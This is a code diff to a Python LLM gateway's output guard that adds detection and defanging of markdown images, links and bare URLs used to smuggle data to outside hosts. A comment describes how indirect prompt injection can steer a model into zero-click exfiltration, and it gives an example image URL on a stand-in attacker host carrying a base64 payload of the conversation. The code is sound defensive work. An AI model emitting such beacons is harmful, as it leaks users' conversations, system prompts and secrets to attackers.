@@ -26,18 +26,24 @@ try:
         detect_credential_exposure,
         detect_hallucination_markers,
         detect_ip_leakage,
+        detect_pii,
+        detect_secrets,
         get_compliance_tags,
         is_safety_refusal_output,
         redact_all,
+        _iter_transport_decodes,
     )
 except ImportError:
     from patterns import (
         detect_credential_exposure,
         detect_hallucination_markers,
         detect_ip_leakage,
+        detect_pii,
+        detect_secrets,
         get_compliance_tags,
         is_safety_refusal_output,
         redact_all,
+        _iter_transport_decodes,
     )
 
 LOG = logging.getLogger("gateway.output_guard")
@@ -54,6 +60,136 @@ _VALID_OUTPUT_ACTIONS = frozenset({"block", "redact", "rewrite", "flag", "allow"
 # a benign answer incidentally containing a card/MRN must be masked-in-place, not
 # 403'd. (jailbreak/injection/hallucination/ip_leakage stay blockable.)
 _REDACTABLE_OUTPUT_CATEGORIES = frozenset({"pii", "pci", "phi", "secret", "credential"})
+
+# ── G13: output-side data-exfiltration channel neutralization ───────────────────
+# A model steered by indirect injection can embed its answer with an auto-rendering
+# markdown IMAGE (or a link / bare URL) that points at an attacker-controlled host
+# and smuggles data in the URL path/query/fragment:
+#     ![loading](https://evil.tld/log?d=<base64 of the conversation / system prompt>)
+# When the client renders the markdown, the browser silently GETs the URL — a
+# ZERO-CLICK exfiltration of whatever was encoded, EVEN WHEN the payload is not
+# PII-shaped (so the PII/secret/credential detectors never fire). This is Insecure
+# Output Handling (OWASP LLM02 / LLM05). The output guard neutralizes the channel:
+# it defangs the auto-render (image -> plain link) and masks the smuggled payload,
+# delivering the rest of the answer intact (surgical redact, never whole-block).
+_MD_IMAGE_RE = re.compile(r"!\[([^\]]*)\]\(\s*<?(https?://[^)\s<>]+)>?\s*\)", re.IGNORECASE)
+_MD_LINK_RE = re.compile(r"(?<!!)\[([^\]]*)\]\(\s*<?(https?://[^)\s<>]+)>?\s*\)", re.IGNORECASE)
+_BARE_URL_RE = re.compile(r"(?<![\]\(\[])https?://[^\s)<>\[\]]+", re.IGNORECASE)
+# Cap the number of URLs inspected per output so a pathological response with
+# thousands of links cannot make neutralization super-linear.
+_MAX_EXFIL_URLS = 256
+
+
+def _url_tail(url: str) -> str:
+    """The exfil-bearing portion of a URL: path + query + fragment (scheme+host dropped)."""
+    m = re.match(r"https?://[^/?#]*(.*)", url, re.IGNORECASE)
+    return m.group(1) if m else ""
+
+
+def _url_host_prefix(url: str) -> str:
+    """``scheme://host`` prefix of ``url`` (everything before path/query/fragment)."""
+    m = re.match(r"(https?://[^/?#]*)", url, re.IGNORECASE)
+    return m.group(1) if m else url
+
+
+def _url_smuggles_data(url: str) -> str:
+    """Return a non-empty reason if ``url`` carries a smuggled data payload.
+
+    Two independent signals over the URL tail (path/query/fragment):
+      * ``"encoded_payload"`` — an encoded blob that base64/hex-DECODES to
+        mostly-printable text (arbitrary-data exfil: conversation, system prompt,
+        identifiers). A random hash / HMAC signature decodes to binary and does
+        NOT trip this, separating exfil from legit long opaque tokens.
+      * ``"sensitive_payload"`` — detected PII / secret / credential in the raw or
+        decoded tail (plaintext or encoded PII exfil).
+    """
+    tail = _url_tail(url)
+    if not tail:
+        return ""
+    # A base64 blob smuggled in a PATH segment (…/beacon/<blob>.png) is fused with
+    # the surrounding '/' and '.' (both legal in base64/URLs) so it won't decode as
+    # one clean token. Also scan a delimiter-split view so each path/query segment
+    # is an isolated decode candidate. (The raw tail still covers query blobs that
+    # use standard-base64 '/' which the split would otherwise break.)
+    segmented = re.sub(r"[/?&=#;,.\s]+", " ", tail)
+    decoded_parts: list[str] = []
+    for src in (tail, segmented):
+        for tok, dec in _iter_transport_decodes(src):
+            if len(tok) >= 24 and len(dec) >= 8:
+                decoded_parts.append(dec)
+    probe = tail + "\n" + segmented + (("\n" + "\n".join(decoded_parts)) if decoded_parts else "")
+    if detect_pii(probe) or detect_secrets(probe) or detect_credential_exposure(probe):
+        return "sensitive_payload"
+    if decoded_parts:
+        return "encoded_payload"
+    return ""
+
+
+def _scan_exfil_channels(text: str):
+    """Yield ``(kind, url, reason)`` for each data-exfiltration channel in ``text``.
+
+    ``kind`` is ``"image"`` (zero-click auto-render), ``"link"`` (one-click) or
+    ``"bare"``. Images trip on EITHER signal (zero-click, and answer images are
+    static assets so an opaque data payload is the beacon signature — low FP).
+    Links / bare URLs trip ONLY on the stronger ``"sensitive_payload"`` signal:
+    they legitimately carry long opaque tokens (presigned / tracking URLs), so an
+    encoded-blob-alone would false-positive.
+    """
+    if not text or ("http://" not in text and "https://" not in text):
+        return
+    seen: set[tuple[str, str]] = set()
+    budget = _MAX_EXFIL_URLS
+    for kind, regex in (("image", _MD_IMAGE_RE), ("link", _MD_LINK_RE), ("bare", _BARE_URL_RE)):
+        for m in regex.finditer(text):
+            if budget <= 0:
+                return
+            budget -= 1
+            url = (m.group(2) if kind != "bare" else m.group(0)).strip().rstrip(").,'\"")
+            reason = _url_smuggles_data(url)
+            if not reason:
+                continue
+            if kind != "image" and reason != "sensitive_payload":
+                continue
+            key = (kind, url)
+            if key in seen:
+                continue
+            seen.add(key)
+            yield kind, url, reason
+
+
+def neutralize_exfil_channels(text: str) -> str:
+    """Defang output-side data-exfiltration channels: mask the smuggled payload and
+    stop the zero-click auto-render (image -> plain link). Strict no-op on benign
+    markdown / URLs (only constructs that trip :func:`_url_smuggles_data` change)."""
+    if not text or ("http://" not in text and "https://" not in text):
+        return text
+
+    def _defang(url: str) -> str:
+        raw = url.strip().rstrip(").,'\"")
+        return f"{_url_host_prefix(raw)}/[exfil-redacted]"
+
+    def _img_sub(m: "re.Match[str]") -> str:
+        url = m.group(2).strip().rstrip(").,'\"")
+        if _url_smuggles_data(url):  # image trips on either signal
+            return f"[{m.group(1)}]({_defang(url)})"  # drop leading '!' -> no auto-render
+        return m.group(0)
+
+    def _link_sub(m: "re.Match[str]") -> str:
+        url = m.group(2).strip().rstrip(").,'\"")
+        if _url_smuggles_data(url) == "sensitive_payload":
+            return f"[{m.group(1)}]({_defang(url)})"
+        return m.group(0)
+
+    def _bare_sub(m: "re.Match[str]") -> str:
+        url = m.group(0).strip().rstrip(").,'\"")
+        if _url_smuggles_data(url) == "sensitive_payload":
+            return _defang(url)
+        return m.group(0)
+
+    out = _MD_IMAGE_RE.sub(_img_sub, text)
+    out = _MD_LINK_RE.sub(_link_sub, out)
+    out = _BARE_URL_RE.sub(_bare_sub, out)
+    return out
 
 _STOPWORDS = frozenset({
     "the", "a", "an", "is", "are", "was", "were", "be", "been", "being",
@@ -284,6 +420,16 @@ class OutputGuard:
             if leakage_verdict.action != "allow":
                 verdicts.append(leakage_verdict)
 
+        # G13: neutralize output-side data-exfiltration channels (markdown image /
+        # link / bare URL smuggling data to an external host). Redactable + delivered
+        # 200 (defang the beacon, keep the answer); never whole-response blocked.
+        if _enabled("output_exfil_enabled", True):
+            exfil_action = _action("output_exfil_action", "redact")
+            if exfil_action != "allow":
+                exfil_verdict = self._check_exfil_channel(text, exfil_action)
+                if exfil_verdict.action != "allow":
+                    verdicts.append(exfil_verdict)
+
         # ── Tier-2: ZeroShield guard model (ML) on the OUTPUT ───────────────
         # Mirrors INPUT scanning: the static detectors above are tier-1; the
         # ZeroShield guard model then scans the model output (same guard model +
@@ -498,6 +644,37 @@ class OutputGuard:
                 compliance_tags=["DLP"],
             )
         return OutputVerdict()
+
+    def _check_exfil_channel(self, text: str, action: str = "redact") -> OutputVerdict:
+        """G13: detect data-exfiltration channels in the model output.
+
+        The client-facing ``detail`` names only the channel kind and destination
+        host (safe) — never the smuggled payload, which is masked by
+        :func:`neutralize_exfil_channels` on the sanitized egress.
+        """
+        findings = list(_scan_exfil_channels(text))
+        if not findings:
+            return OutputVerdict()
+        kinds = sorted({k for k, _u, _r in findings})
+        hosts: list[str] = []
+        for _k, url, _r in findings:
+            hm = re.match(r"https?://([^/?#]*)", url, re.IGNORECASE)
+            if hm and hm.group(1):
+                hosts.append(hm.group(1))
+        zero_click = any(k == "image" for k, _u, _r in findings)
+        host_list = ", ".join(sorted(set(hosts))[:3]) or "external host"
+        return OutputVerdict(
+            action=action,
+            threat_type="exfil_channel",
+            confidence=0.9 if zero_click else 0.8,
+            detail=(
+                f"Data-exfiltration channel in output "
+                f"({'/'.join(kinds)} -> {host_list}): smuggled payload neutralized"
+                + (" (zero-click auto-render defanged)" if zero_click else "")
+            ),
+            matched_patterns=[f"exfil_{k}" for k in kinds],
+            compliance_tags=["DLP"],
+        )
 
     async def score_hallucination(
         self,
@@ -885,9 +1062,33 @@ def sanitize_output_for_verdict(
     *,
     redact_pii_fn=None,
 ) -> str:
-    """Apply the correct sanitization for an output-guard verdict action."""
+    """Apply the correct sanitization for an output-guard verdict action.
+
+    G13: whatever category won the verdict, the egress is ALWAYS passed through
+    :func:`neutralize_exfil_channels` FIRST as a defense-in-depth pass, so a
+    data-exfiltration beacon can never ride out alongside (e.g.) a PII redact when
+    the PII verdict was selected. Neutralize runs BEFORE core redaction so it sees
+    the original (unmasked) URL — otherwise masking the payload first would hide
+    the exfil signal and leave the auto-render intact. No-op on benign markdown/URLs.
+    """
+    neutralized = neutralize_exfil_channels(response_text)
+    return _sanitize_output_core(neutralized, verdict, redact_pii_fn=redact_pii_fn)
+
+
+def _sanitize_output_core(
+    response_text: str,
+    verdict: OutputVerdict,
+    *,
+    redact_pii_fn=None,
+) -> str:
+    """Category-specific sanitization for an output-guard verdict action."""
     threat = str(verdict.threat_type or "")
     action = str(verdict.action or "allow")
+    # G13: an exfil-channel verdict is fixed by the wrapper's neutralize pass
+    # (defang the beacon in place). Here just mask any incidental PII while keeping
+    # the rest of the answer — never nuke the whole response to [REDACTED].
+    if threat == "exfil_channel":
+        return redact_pii_fn(response_text) if redact_pii_fn is not None else response_text
     # 1.7: PII / secret / credential (+ pci / phi — C-1) are ALWAYS surgically
     # redacted (deterministic token-level masking via redact_pii_fn), never
     # routed through the non-deterministic "rewrite" path — regardless of action.
